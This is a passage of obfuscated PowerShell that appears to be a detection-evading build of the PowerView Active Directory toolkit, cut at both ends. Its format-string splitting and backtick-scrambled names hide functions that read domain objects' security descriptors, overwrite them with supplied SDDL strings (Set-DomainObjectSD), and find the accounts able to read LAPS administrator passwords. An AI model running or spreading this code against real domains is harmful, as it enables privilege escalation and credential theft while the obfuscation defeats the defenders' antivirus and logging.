            ("{0}{1}{2}" -f'Prope','rtie','s') = ("{4}{0}{5}{2}{8}{10}{3}{7}{9}{6}{1}" -f'coun','tsid','ame,ntse','scriptor,distingui','samac','tn','jec','shedn','curity','ame,ob','de')
        }

        ${S`eaRCHe`RarG`UmentS}[("{1}{2}{0}"-f'ks','SecurityM','as')] = ("{0}{1}"-f'Dac','l')
        if (${p`sb`OUN`dP`AR`AmeTeRs}[("{1}{0}" -f 'in','Doma')]) { ${sEArCH`Er`ArgUm`e`NTs}[("{1}{0}" -f 'main','Do')] = ${do`M`AIn} }
        if (${psb`oUNdP`A`R`AmeTeRs}[("{2}{1}{0}" -f 'Base','h','Searc')]) { ${sear`cH`eRArg`Ume`N`TS}[("{0}{2}{1}"-f 'Searc','se','hBa')] = ${S`e`ARC`hBasE} }
        if (${P`sb`o`U`NdPARametE`Rs}[("{2}{0}{1}"-f 'r','ver','Se')]) { ${sEaRc`h`ER`ArG`Um`ENTS}[("{1}{2}{0}" -f'er','Se','rv')] = ${S`eRVer} }
        if (${PS`BounDParam`et`ERs}[("{1}{0}{2}"-f 'hSc','Searc','ope')]) { ${S`e`A`RCHeRAR`guM`eNTS}[("{1}{3}{2}{0}" -f 'cope','S','chS','ear')] = ${sEa`Rc`HSc`OPe} }
        if (${p`SbOuNdp`AR`Am`ETERs}[("{1}{0}{3}{2}"-f 'ultP','Res','ize','ageS')]) { ${seARChERa`RGU`M`ENts}[("{3}{4}{1}{2}{0}"-f 'ze','PageS','i','Res','ult')] = ${RESU`LtPag`E`sizE} }
        if (${PsBoUNdpARa`m`Ete`Rs}[("{4}{0}{1}{3}{2}"-f 'rver','Ti','imit','meL','Se')]) { ${SE`A`RCh`eR`ArGUme`NTS}[("{0}{2}{1}" -f'Server','imit','TimeL')] = ${SERvert`I`Me`LiMit} }
        if (${pS`BOUNdp`ArA`m`Et`ERs}[("{1}{2}{0}"-f 'e','Tombsto','n')]) { ${se`ARcHEr`A`Rg`Um`EnTS}[("{2}{0}{1}" -f 'mbst','one','To')] = ${TombS`T`oNe} }
        if (${PsbOu`Nd`PAR`Ame`TE`Rs}[("{1}{0}{2}" -f'entia','Cred','l')]) { ${SeARcH`eRa`RGUM`e`NtS}[("{2}{1}{0}" -f'tial','n','Crede')] = ${c`Re`DEnTIal} }
        ${SE`ARc`heR} = &("{0}{1}{2}{3}" -f'Get-DomainSear','c','h','er') @SearcherArguments
    }

    PROCESS {
        if (${SE`A`RcHEr}) {
            ${FI`L`TEr} = ''
            ${ch`ecks} = ''
            ${ide`NtI`TY} | &("{3}{1}{2}{0}{5}{4}" -f'ntityFi','-Id','e','Get','rString','lte') | &("{0}{3}{2}{1}{4}"-f'ForE','e','h-Obj','ac','ct') {
                ${FIL`Ter} += ${_}
            }
            if (!(${FI`LTeR}) -and ${PsbO`U`ND`pARAmEt`e`Rs}[("{0}{1}"-f 'Ch','eck')] -and (&("{1}{0}"-f'st-Path','Te') -Path ${CH`ECk} -PathType ("{1}{0}"-f'f','Lea'))) {
                ${c`HE`ckS} = &("{0}{1}{2}"-f 'Impo','r','t-Csv') ${Ch`e`ck}
                ${C`HEc`KS} | &("{1}{3}{2}{0}" -f 't','ForEach-Ob','c','je') {${Fil`Ter} += &("{2}{0}{3}{1}{5}{4}{6}" -f 'et-Iden','t','G','ti','lterS','yFi','tring') ${_}."OBj`E`CTsId"}
            }
            if (${f`ILT`eR}) {
                ${S`EARCH`eR}."Filt`eR" = "(|$Filter)"
                &("{2}{1}{0}"-f'erbose','e-V','Writ') "[Get-DomainObjectSD] Using filter: $($Searcher.filter) "
                ${OB`JEc`Ts} = @()
                ${r`esULtS} = ${SeAR`ch`er}.("{0}{1}"-f 'F','indAll').Invoke()
                ${Re`sULTS} | &("{2}{0}{1}" -f 'e-O','bject','Wher') {${_}} | &("{4}{1}{2}{0}{3}"-f'j','ach-O','b','ect','ForE') {
                    ${obJE`cT} = ${_}."PropErt`I`es"

                    if (${oB`JecT}."O`B`J`ECTSiD" -and ${oB`Ject}."OBj`e`c`TSID"[0]) {
                        ${O`B`JEcTs`Id} = (&("{2}{1}{0}{3}"-f 'Obj','ew-','N','ect') ("{0}{4}{7}{5}{3}{9}{8}{2}{6}{1}" -f 'Syste','ier','yIdent','pal.Secu','m.Sec','nci','if','urity.Pri','t','ri')(${O`BJ`EcT}."O`Bj`eCtSid"[0],0))."VA`Lue"
                    }
                    else {
                        ${objeCt`S`ID} = ${nU`LL}
                    }

                    ${SeCuR`ityD`eSc`RipTor} = &("{2}{0}{1}" -f 'ew-Obj','ect','N') ("{3}{4}{10}{8}{9}{6}{1}{0}{2}{11}{5}{7}"-f'aw','.R','Se','Security','.','tyDescr','ol','iptor','Cont','r','Access','curi') -ArgumentList ${objE`cT}[("{4}{0}{1}{3}{2}"-f'rit','ydesc','or','ript','ntsecu')][0], 0
                    ${SdDlo`B`ject} = &("{0}{1}{2}" -f 'N','ew-Ob','ject') ("{0}{2}{1}" -f 'P','ect','SObj')
                    ${Sdd`L`ob`JECT} | &("{1}{0}{2}" -f 'embe','Add-M','r') ("{0}{1}" -f'Objec','tSID') ${Ob`JEC`TS`Id}
                    ${sd`DloBje`Ct} | &("{1}{3}{2}{0}"-f 'mber','A','d-Me','d') ("{3}{1}{0}{2}"-f 'ct','bje','SDDL','O') ${s`E`cUr`iTyDeScriP`TOR}.("{3}{1}{2}{0}"-f 'Form','tSd','dl','Ge').Invoke(15)
                    if (${c`hec`Ks}) {
                        ${SDDLToc`H`E`CK} = ${ch`E`Cks} | &("{1}{2}{3}{0}"-f'Object','Wher','e','-') {${_}."oBJEC`T`s`iD" -eq ${oBJ`eCt`sId}}
                        if (${s`DDl`TOch`ECk}."ObJe`C`TSDdL" -eq ${SDDl`oBj`E`ct}."Ob`J`E`cTsddL") {
                            &("{3}{4}{1}{0}{2}"-f 'Ve','-','rbose','W','rite') "[Get-DomainObjectSD] SD for $($Object.samaccountname) is the same as the one provided "
                        }
                        else {
                            &("{2}{0}{1}"-f'rite-Warni','ng','W') "[Get-DomainObjectSD] SD for $($Object.samaccountname) is different to the one provided "
                            ${s`D`dlo`BJeCt}
                            ${OB`j`ECTS} += ${S`dd`loB`jeCt}
                        }
                    }
                    elseif (${pSb`o`U`NDPARa`meTERs}[("{0}{1}" -f 'C','heck')] -and ${C`HeCK} -eq ${SD`d`loBjecT}."O`BJe`CtsddL") {
                        &("{2}{1}{0}{3}" -f'W','rite-','W','arning') "[Get-DomainObjectSD] SD for $($Object.samaccountname) is the same as the one provided "
                    }
                    elseif (${PSB`OunDpara`METE`RS}[("{0}{1}" -f 'Chec','k')]) {
                        &("{1}{3}{2}{0}"-f'g','Write-War','in','n') "[Get-DomainObjectSD] SD for $($Object.samaccountname) is different to the one provided "
                        ${sDdL`O`B`JecT}
                        ${obJ`E`cts} += ${sDD`LO`BJect}
                    }
                    else {
                        ${SddLO`Bj`Ect}
                        ${OBje`CTS} += ${s`dd`lobJ`EcT}
                    }
                }
                if (${psb`o`U`NDPARAme`T`ErS}[("{1}{0}"-f 'File','Out')]) {
                    try {
                        &("{1}{0}{3}{4}{2}" -f'e-V','Writ','e','e','rbos') ('[Ge'+'t-Do'+'ma'+'inObjectS'+'D] '+'Wri'+'tin'+'g '+'objec'+'t '+'SD'+' '+'informa'+'ti'+'on '+'to'+' '+"$OutFile")
                        ${OBjE`c`Ts} | &("{4}{0}{3}{1}{2}" -f 'E','jec','t','ach-Ob','For') { &("{1}{2}{0}"-f 'sv','Expo','rt-C') -InputObject ${_} -Path ${oUT`FILE} -Append }
                    }
                    catch {
                        &("{0}{1}{2}" -f'Wr','i','te-Warning') ('['+'G'+'et-Domai'+'nObjec'+'t'+'SD] '+'U'+'nable '+'t'+'o '+'wr'+'it'+'e '+"$OutFile")
                    }
                } 
            }
        }
    }
}


function SEt-d`O`mAi`N`Ob`JectSD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f 'PSShouldP','r','ocess'}, '')]
    [OutputType({"{3}{1}{2}{0}{4}"-f'AC','e','w.','PowerVi','L'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSItIOn = 0, vAlUefROmPipeliNE = ${T`Rue}, VALuEFroMPIpelINEByProPERtyNAme = ${tR`Ue})]
        [Alias({"{0}{4}{2}{1}{5}{3}"-f 'D','guish','in','Name','ist','ed'}, {"{2}{0}{1}" -f'tN','ame','SamAccoun'}, {"{0}{1}" -f'Na','me'})]
        [String[]]
        ${ID`e`NTITY},

        [String]
        ${I`NPu`TfiLE},

        [String]
        ${SD`dlSt`RI`NG},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMa`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'lter','Fi'})]
        [String]
        ${l`DA`pfil`TEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'h','ADSPat'})]
        [String]
        ${sEA`RCh`Ba`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'r','Do','mainControlle'})]
        [String]
        ${SEr`VeR},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{0}{1}{2}"-f'One','Lev','el'}, {"{1}{0}"-f 'ubtree','S'})]
        [String]
        ${sEaRC`HSCo`Pe} = ("{1}{2}{0}"-f'btree','S','u'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsul`TP`AgESIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`E`RveRtim`e`LIMIt},

        [Switch]
        ${tOmBst`O`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`Ed`ENT`IAl} =  ( GET-vARiABlE ("7t"+"Q02")  )."vA`LUe"::"em`PtY"
    )

    BEGIN {
        ${Sea`RcH`ERA`RG`UmeNTs} = @{
            ("{0}{1}{2}"-f'Pr','o','perties') = ("{3}{5}{0}{16}{15}{6}{9}{17}{2}{8}{13}{14}{10}{18}{1}{11}{12}{4}{7}" -f'unt','inguishedname,ob','yd','sama','s','cco','ntsecu','id','esc','ri','tor,di','je','ct','r','ip','me,','na','t','st')
        }

        ${S`EaRchErAR`G`UMENTs}[("{3}{2}{0}{4}{1}"-f'ityM','sks','cur','Se','a')] = ("{0}{1}" -f'D','acl')
        if (${PsBouNdP`ARAme`T`ERS}[("{1}{0}" -f'n','Domai')]) { ${sE`ARcHEr`Ar`gUmeNtS}[("{0}{1}" -f 'Do','main')] = ${do`m`AIn} }
        if (${PsbOu`NDpArAME`T`Ers}[("{0}{3}{1}{2}" -f'Searc','s','e','hBa')]) { ${SEArCHe`RA`R`g`UMeNTS}[("{0}{2}{1}"-f'Sear','se','chBa')] = ${SE`AR`ChBA`se} }
        if (${PSB`OU`NDpA`RA`MetErs}[("{1}{0}"-f 'erver','S')]) { ${SeA`RchER`A`Rg`Um`EnTs}[("{1}{0}"-f 'r','Serve')] = ${S`er`VEr} }
        if (${Psb`O`UNDP`A`R`AMETErs}[("{1}{3}{0}{2}" -f'rchScop','Se','e','a')]) { ${SE`ARcH`Er`ArG`UmE`Nts}[("{2}{0}{1}" -f 'archS','cope','Se')] = ${SeaRC`H`SC`OPe} }
        if (${PsBo`Un`dp`A`RAMEters}[("{0}{1}{2}" -f'ResultP','a','geSize')]) { ${Se`ARchERa`RGuM`eNTS}[("{0}{2}{3}{1}{4}" -f'Re','eSi','sult','Pag','ze')] = ${rE`s`UlTPA`G`ESize} }
        if (${PS`B`oUNDPaR`Am`eTERs}[("{2}{0}{3}{1}"-f'rT','mit','Serve','imeLi')]) { ${s`e`ARchE`RAr`guME`NTS}[("{2}{0}{1}" -f 'Limi','t','ServerTime')] = ${sErVE`RtiMeL`Im`iT} }
        if (${p`Sb`oUndPAram`ETE`RS}[("{1}{0}{2}"-f 'bs','Tom','tone')]) { ${SEAR`cH`ERARG`UMentS}[("{0}{2}{1}"-f'To','bstone','m')] = ${t`oM`BsToNe} }
        if (${P`S`BO`U`NDPar`AMeteRs}[("{0}{2}{1}" -f 'Crede','al','nti')]) { ${SEA`RcHe`R`A`RGuMen`Ts}[("{2}{1}{0}" -f 'ial','nt','Crede')] = ${C`REdE`NtIAl} }
        ${SeA`R`chER} = &("{1}{0}{3}{2}"-f 'Domain','Get-','r','Searche') @SearcherArguments
    }

    PROCESS {
        if (${s`E`ARcH`ER}) {
            ${R`ESTOrE`Ta`Rge`Ts} = @{}
            ${F`i`lTer} = ''
            if (${PSb`oUNd`P`ArameTE`RS}[("{0}{1}{2}" -f'Inpu','tF','ile')]) {
                try {
                    &("{2}{0}{3}{1}" -f 'i','ose','Wr','te-Verb') ('[Set-D'+'om'+'a'+'in'+'Objec'+'tSD'+'] '+'Readi'+'ng '+'p'+'rovi'+'d'+'ed '+'inpu'+'t '+'fi'+'l'+'e: '+"$InputFile")
                    &("{2}{0}{1}"-f 'mport-C','sv','I') ${in`p`UtFI`Le} | &("{0}{1}{3}{2}" -f'ForEach','-Obje','t','c') {
                        ${R`ES`TorEtar`Ge`TS}.("{1}{0}" -f'd','Ad').Invoke(${_}."O`BJE`CTSid", ${_}."oBj`ECt`sddL")
                    }
                }
                catch {
                    &("{2}{1}{0}"-f'ng','rni','Write-Wa') ('[Se'+'t-D'+'omai'+'nObjectSD]'+' '+'Unabl'+'e '+'t'+'o '+'read'+' '+"$InputFile")
                }
                ${rEsTorE`TA`RG`ets}."k`Eys" | &("{3}{1}{5}{2}{0}{4}{7}{6}"-f't','ntit','l','Get-Ide','erS','yFi','g','trin') | &("{3}{1}{2}{0}"-f 'bject','rEac','h-O','Fo') {
                    ${F`iLteR} += ${_}
                }
            } 
            elseif (${iDENT`ItY} -and ${SD`DLsT`RING}) {
                &("{1}{3}{2}{0}"-f 'se','Write-','bo','Ver') ('[S'+'et-Dom'+'ain'+'O'+'bjectSD] '+'Setti'+'ng '+'p'+'rov'+'ided '+'ide'+'n'+'tities: '+"$Identity")
                ${IDE`NTI`Ty} | &("{2}{1}{0}{5}{4}{3}" -f 'tyF','denti','Get-I','g','n','ilterStri') | &("{2}{3}{1}{0}"-f 'ject','b','For','Each-O') {
                    ${f`Ilt`Er} += ${_}
                }
            }
            if (${fIL`TEr}) {
                ${SEa`RcH`ER}."FIl`TeR" = "(|$Filter)"
                ${r`eSUL`TS} = ${SEaR`ChER}.("{1}{2}{0}" -f'ndAll','F','i').Invoke()
                ${RE`SuL`Ts} | &("{2}{0}{3}{1}"-f're-Ob','ct','Whe','je') {${_}} | &("{3}{0}{2}{4}{1}"-f'Ea','ect','ch-Ob','For','j') {
                    ${objE`ct} = ${_}

                    if (${O`BJEct}."pROPer`Ti`es"."ob`j`EC`TSID" -and ${o`BJ`Ect}."ProPE`R`TIes"."Objec`T`SiD"[0]) {
                        ${obj`EC`TsID} = (&("{2}{0}{1}"-f 'ew-','Object','N') ("{0}{9}{10}{6}{7}{11}{1}{5}{2}{4}{8}{3}"-f 'Sys','al.Secu','de','fier','nt','rityI','.Se','curit','i','t','em','y.Princip')(${oB`J`Ect}."PRoP`eRT`IeS"."OBjec`T`SiD"[0],0))."v`Alue"
                    }
                    else {
                        ${Ob`J`ECTSId} = ${Nu`ll}
                    }
                    if (${PSB`oun`DPaRA`MEtErs}[("{0}{1}{2}" -f'In','putF','ile')]) {
                        ${S`d`dLstRinG} = ${RestOR`E`TARg`ets}.${Ob`jeC`TSId}
                    }

                    
                    &("{2}{1}{0}{3}{4}" -f 'te-','ri','W','Ve','rbose') ('[Set'+'-Domai'+'nObjec'+'t'+'SD'+'] '+'B'+'uil'+'ding '+'ra'+'w '+'SD'+' '+'from'+' '+'S'+'DDL '+'st'+'ring: '+"$SDDLString")
                    ${s`d} = &("{0}{2}{1}"-f'N','ject','ew-Ob') ("{5}{4}{7}{8}{6}{10}{2}{0}{3}{9}{1}"-f 'ityD','iptor','r','esc','y.','Securit','ntrol.RawSec','Acce','ssCo','r','u') -ArgumentList ${s`D`DLString}
                    ${Sdb`Y`TES} = &("{2}{1}{0}"-f'-Object','ew','N') ("{1}{0}"-f 'yte[]','b') (${S`d}."B`iNAR`yLEN`GTh")
                    ${SD}.("{3}{2}{0}{1}"-f 'a','ryForm','Bin','Get').Invoke(${S`D`ByTES}, 0)

                    ${E`N`TRy} = ${oBJE`ct}.("{1}{3}{0}{2}"-f'to','GetDire','ryEntry','c').Invoke()
                    try {
                        &("{2}{0}{1}" -f'e-','Verbose','Writ') "[Set-DomainObjectSD] Setting 'ntsecuritydescriptor' to '$SDBytes' for object '$($Object.Properties.samaccountname)' "
                        ${En`T`Ry}.("{1}{0}" -f 'okeSet','Inv').Invoke(("{4}{3}{2}{0}{1}"-f'ri','ptor','ritydesc','secu','nt'), ${SDb`y`TES})
                        ${E`Ntry}.("{3}{0}{2}{1}" -f 'cha','es','ng','commit').Invoke()
                    }
                    catch {
                        &("{1}{2}{3}{4}{0}"-f 'g','W','rite-','Warn','in') "[Set-DomainObjectSD] Error setting security descriptor for object '$($Object.Properties.samaccountname)' : $SDBytes "
                        &("{2}{0}{3}{1}" -f'rite','ng','W','-Warni') ("{6}{8}{2}{1}{3}{11}{10}{4}{0}{7}{9}{5}{12}"-f 'h','nObje','omai','ctS',' ',' privile','[Set','ave Owne','-D','r','e you','D] Make sur','ges')
                    }

                }
            }
        }
    }

}

function gET`-`domaI`NdN {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}" -f 'uldPro','ce','PSSho','ss'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{2}{1}{0}"-f'er','oll','nContr','Do','mai'})]
        [String]
        ${S`e`RVeR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRED`E`NTiAL} =  ( get-ITeM ("{0}{1}{3}{2}"-f 'VariAb','le:7T','2','q0'))."v`ALUe"::"E`mPTY",

        [Switch]
        ${S`Sl},

        [Switch]
        ${o`B`FUSCaTe}
    )

    ${searcheRA`R`gu`ME`N`TS} = @{
        ("{2}{1}{0}" -f'r','PFilte','LDA') = ("{3}{6}{10}{1}{8}{9}{2}{4}{0}{7}{5}{11}" -f'1355','Ac','tControl:1.2.840','(','.1','4.803:=8192','use','6.1.','co','un','r',')')
    }
    if (${p`Sb`ouND`pArametERS}[("{0}{2}{1}"-f 'Do','ain','m')]) { ${SEa`RC`H`eRaR`GUMeNTs}[("{0}{1}" -f 'Dom','ain')] = ${do`Ma`In} }
    if (${PSbOU`ND`pA`R`Am`EtERS}[("{0}{1}" -f'Serve','r')]) { ${SeAr`cherA`R`Gume`NtS}[("{1}{0}"-f 'r','Serve')] = ${S`er`VEr} }
    if (${p`S`Bo`Un`DpaRAMETerS}[("{2}{0}{1}{3}"-f 'enti','a','Cred','l')]) { ${S`e`A`Rcherar`gumenTS}[("{0}{3}{2}{1}" -f'Cre','l','entia','d')] = ${CR`EDENt`ial} }
    if (${PSBOUnDp`A`RamET`E`Rs}['SSL']) { ${Se`AR`CheRarGum`entS}['SSL'] = ${s`sL} }
    if (${Psb`ou`Nd`p`AramEteRS}[("{1}{2}{0}" -f 'e','Ob','fuscat')]) {${S`eA`RChE`Ra`RGuMEntS}[("{0}{1}{2}"-f 'Obf','u','scate')] = ${oBF`Us`catE} }

    if (${p`Sb`oUn`DPARaME`Te`RS}[("{1}{0}" -f 'omain','D')]) {
        ${do`MaI`Ndn} = "DC=$($Domain -replace '\.',',DC=')"
    }
    else {
        ${D`cdN} = &("{3}{2}{0}{4}{1}" -f'u','r','ainComp','Get-Dom','te') @SearcherArguments -FindOne | &("{1}{2}{0}" -f't-Object','Sele','c') -First 1 -ExpandProperty ("{0}{5}{3}{1}{2}{4}"-f 'dis','ed','n','sh','ame','tingui')

        if (${d`CDN}) {
            ${DOMain`DN} = ${DC`dN}.("{2}{0}{3}{1}" -f'ubStr','g','S','in').Invoke(${DC`Dn}.("{2}{0}{1}" -f'de','xOf','In').Invoke(("{0}{1}"-f',D','C='))+1)
        }
        else {
            &("{0}{2}{1}"-f 'W','erbose','rite-V') ('[Ge'+'t'+'-DomainDN'+'] '+'Er'+'r'+'or '+'extrac'+'ti'+'ng '+'dom'+'a'+'in '+'DN'+' '+'f'+'or '+"'$Domain'")
        }
    }
    if (${do`MaI`N`Dn}) {
        ${D`oMa`IndN}
    }
    else {
        &("{2}{0}{1}"-f 'ite-Verbos','e','Wr') ('[G'+'et-D'+'o'+'mai'+'nDN] '+'Er'+'ror '+'resol'+'v'+'i'+'ng '+'d'+'o'+'main '+'DN'+' '+'fo'+'r '+"'$Domain'")
    }
}

function GEt`-DOM`AINL`ApSre`AD`E`RS {

    [OutputType([PSObject])]
    [CmdletBinding()]
    Param (
        [Parameter(pOSitioN = 0, vALuEFrOmpIpELINE = ${T`Rue}, valUefroMPiPeliNEBypropeRTynAME = ${TR`UE})]
        [Alias({"{2}{0}{1}{3}" -f'Account','Nam','Sam','e'}, {"{0}{1}"-f'Na','me'}, {"{1}{0}{2}{3}" -f 'ost','DNSH','Nam','e'})]
        [String[]]
        ${IDeNT`i`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMa`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Fi','lter'})]
        [String]
        ${LdapfI`lt`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROp`Er`TiES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f'SPat','h','AD'})]
        [String]
        ${SeA`RcH`BA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}"-f'i','ma','Do','nController'})]
        [String]
        ${seR`Ver},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{1}{2}{0}"-f'vel','One','Le'}, {"{0}{1}" -f'S','ubtree'})]
        [String]
        ${sea`Rc`h`sCopE} = ("{2}{1}{0}" -f 'e','ubtre','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESuL`TP`AGEs`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sER`VeR`TiMELI`mIt},

        [ValidateSet({"{0}{1}" -f 'D','acl'}, {"{0}{1}"-f'Gro','up'}, {"{0}{1}"-f 'No','ne'}, {"{1}{0}"-f'r','Owne'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${SeCUri`TYMA`skS},

        [Switch]
        ${toMB`STO`NE},

        [Alias({"{2}{1}{0}" -f'ne','turnO','Re'})]
        [Switch]
        ${F`inDoNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREDent`i`Al} =   (  gET-vaRIabLe  ("7"+"tQ02") )."vA`LUe"::"e`mpty"
    )


    BEGIN {
        ${SEArC`HE`Ra`RGUM`ents} = @{}
        if (${Psb`Oundp`A`R`Amet`eRs}[("{1}{0}" -f 'n','Domai')]) { ${S`EARChErAR`g`UMe`NTs}[("{2}{1}{0}"-f'in','oma','D')] = ${DoMA`In} }
        if (${p`Sb`ou`N`dpa`RaMETErS}[("{1}{2}{0}" -f'perties','Pr','o')]) { ${S`e`Arc`He`RA`RgUMEnts}[("{1}{2}{0}"-f 'erties','Pr','op')] = ${pRoP`eRt`I`ES} }
        if (${PS`BOunDPARaM`e`TerS}[("{2}{1}{0}"-f'rchBase','ea','S')]) { ${s`EaR`CHerArG`Um`eNTS}[("{0}{1}{2}" -f 'S','earchB','ase')] = ${s`EaRc`HB`ASE} }
        if (${pSBoun`DP`AraMet`erS}[("{1}{0}" -f 'rver','Se')]) { ${SeARC`H`ERarG`U`mE`NTS}[("{1}{0}" -f 'rver','Se')] = ${S`erv`er} }
        if (${PsBoun`DpAra`MEt`E`RS}[("{3}{0}{1}{2}" -f'rchS','cop','e','Sea')]) { ${se`ARCHe`RA`RgUmen`Ts}[("{1}{3}{2}{0}" -f 'ope','Sear','hSc','c')] = ${s`Earc`Hs`cOpE} }
        if (${P`SboUn`DP`AR`AmE`TERS}[("{0}{2}{3}{1}"-f'R','geSize','esultP','a')]) { ${SEarcH`erA`R`GUm`ENTS}[("{2}{0}{1}"-f'tPageS','ize','Resul')] = ${RE`SU`lTPag`e`sIZE} }
        if (${P`SBO`UNdPar`AmET`e`Rs}[("{0}{3}{2}{1}"-f'Se','t','TimeLimi','rver')]) { ${s`EarcH`EraRGUm`Ents}[("{1}{3}{0}{4}{2}" -f 'm','ServerT','imit','i','eL')] = ${SE`RVe`RtImEliMIt} }
        if (${p`sbOuN`d`paraMETERS}[("{2}{1}{0}" -f'yMasks','it','Secur')]) { ${se`A`RChERA`R`gu`MenTs}[("{2}{0}{1}{3}"-f 'curi','tyM','Se','asks')] = ${S`eCUritYM`AsKs} }
        if (${PSB`o`UNdPA`Ra`M`etErs}[("{1}{2}{0}"-f 'e','Tomb','ston')]) { ${s`earcH`erA`RguMe`Nts}[("{2}{0}{1}" -f'o','mbstone','T')] = ${toM`B`STONe} }
        if (${Psbo`UNDPar`Amet`eRs}[("{2}{0}{1}" -f 'redentia','l','C')]) { ${seArCHER`AR`g`UmEntS}[("{2}{1}{0}"-f 'dential','re','C')] = ${CRE`dEN`TIAL} }
        ${s`ea`RCHeR} = &("{4}{0}{2}{5}{1}{3}"-f 'et-Do','h','mai','er','G','nSearc') @SearcherArguments
    }

    PROCESS {
        ${F`ILtEr} = ''
        ${ac`LS} = @()
        if (!(${iDeNT`i`Ty})) {
            ${Ide`NTi`Ty} = (&("{4}{0}{5}{3}{2}{1}" -f'et-D','er','inComput','a','G','om') -HasLAPS @SearcherArguments)."OB`je`Ct`siD"
        }
        ${i`dent`itY} | &("{3}{5}{2}{1}{4}{0}"-f'Acl','c','je','Get-D','t','omainOb') -RightsFilter rE`A`dLapS @SearcherArguments | &("{1}{2}{0}"-f'ct','Fo','rEach-Obje') {
            if (!(${fiL`TEr}) -or (${fi`lTer} -notmatch ${_}."OBJ`ecT`sid")) {
                &("{3}{1}{0}{4}{2}"-f 'Ve','te-','bose','Wri','r') "[Get-DomainLAPSReaders] Adding $($_.ObjectSID) to filter "
                ${F`ILt`eR} += "(objectsid=$($_.ObjectSID))"
            }
            if (${fi`LTER} -notmatch ${_}."S`e`c`UriT`YID`ENtifiEr") {
                &("{0}{2}{1}"-f 'Writ','bose','e-Ver') "[Get-DomainLAPSReaders] Adding $($_.SecurityIdentifier) to filter "
                ${F`il`TER} += "(objectsid=$($_.SecurityIdentifier))"
            }
            ${a`ClS} += ${_}
        }
        if (${FilT`eR}) {
            ${A`CCo`U`NtS} = @()
            ${Sea`R`cher}."Filt`Er" = "(|$Filter)"
            &("{0}{3}{1}{2}" -f'Wri','Ver','bose','te-') "[Get-DomainLAPSReaders] Using filter: $($Searcher.filter) "
            ${R`E`suLtS} = ${sE`Arch`eR}.("{2}{1}{0}"-f'll','dA','Fin').Invoke()
            ${re`suL`Ts} | &("{1}{2}{0}{3}" -f 'e-Objec','W','her','t') {${_}} | &("{0}{4}{1}{3}{2}"-f 'For','ch','ect','-Obj','Ea') {
                ${aCc`ou`NTs} += ${_}."Pro`PER`TIes"
            }

            ${A`ClS} | &("{2}{1}{0}"-f't','ach-Objec','ForE') {
                ${ob`JeCt`S`ID} = ${_}."O`B`j`ectSId"
                ${pR`IN`ciP`A`lSiD} = ${_}."SEcURi`TyI`d`ENtIFi`Er"
                ${a`drIg`hts} = ${_}."A`cTIveDirEC`T`oRyri`gh`Ts"
                ${O`BjEcT} = ${aCCo`U`NTs} | &('?'){(&("{2}{0}{1}" -f'ew-Ob','ject','N') ("{10}{1}{7}{8}{5}{4}{0}{2}{6}{3}{9}"-f'in','e','cipal.Securi','tifi','ty.Pr','i','tyIden','m.S','ecur','er','Syst')(${_}."O`BjeC`TSID"[0],0))."va`Lue" -eq ${O`BjeCT`sId}}
                ${PRIn`c`IP`Al} = ${acC`oU`Nts} | &('?'){(&("{2}{0}{1}" -f'Objec','t','New-') ("{10}{7}{0}{4}{6}{8}{1}{9}{11}{5}{3}{2}"-f '.Se','rincipal.','r','tifie','curit','n','y.','stem','P','Securit','Sy','yIde')(${_}."O`B`Je`CtSID"[0],0))."V`AlUE" -eq ${PrI`NCIPaLs`Id}}
                ${o`U`TOBjeCt} = &("{1}{0}{2}"-f'w-','Ne','Object') ("{0}{1}{2}"-f'PS','Objec','t')
                if (${OB`JEct}) {
                    ${o`UToB`jecT} | &("{0}{2}{1}"-f'Add-','mber','Me') ("{0}{2}{1}"-f 'Obje','Name','ct') ${O`BJe`CT}."SAMAccOu`NTn`AmE"[0]
                    ${O`UtobJ`ect} | &("{2}{1}{0}"-f'er','emb','Add-M') ("{2}{1}{0}"-f'ectType','bj','O') (${Ob`J`eCt}."S`A`maCc`O`UNTtYPe"[0] -as ${sAMA`CCou`NttY`PEENUM})
                }
                ${oUT`oBJE`CT} | &("{1}{2}{0}"-f 'mber','A','dd-Me') ("{0}{2}{3}{1}" -f'Ob','tSID','j','ec') ${O`BJe`CtSId}
                ${O`UtobJ`eCT} | &("{2}{1}{0}"-f 'r','embe','Add-M') ("{1}{0}{2}{4}{3}{5}"-f 't','Ac','iveDire','yRi','ctor','ghts') ${ad`RIgh`TS}
                if (${Pri`NcIP`Al}) {
                    ${OU`TOBj`E`ct} | &("{2}{0}{1}" -f'dd-Mem','ber','A') ("{0}{2}{1}"-f 'Principal','me','Na') ${pri`NCI`PaL}."SA`Macc`Ou`NTname"[0]
                    ${OuT`OBJ`ECT} | &("{0}{2}{1}"-f 'Add-','mber','Me') ("{2}{3}{1}{4}{0}"-f 'lType','p','Pr','inci','a') (${P`RiN`CIPaL}."s`Am`AcCOU`NTt`yPe"[0] -as ${sa`MaC`c`Ou`NtTYPeen`UM})
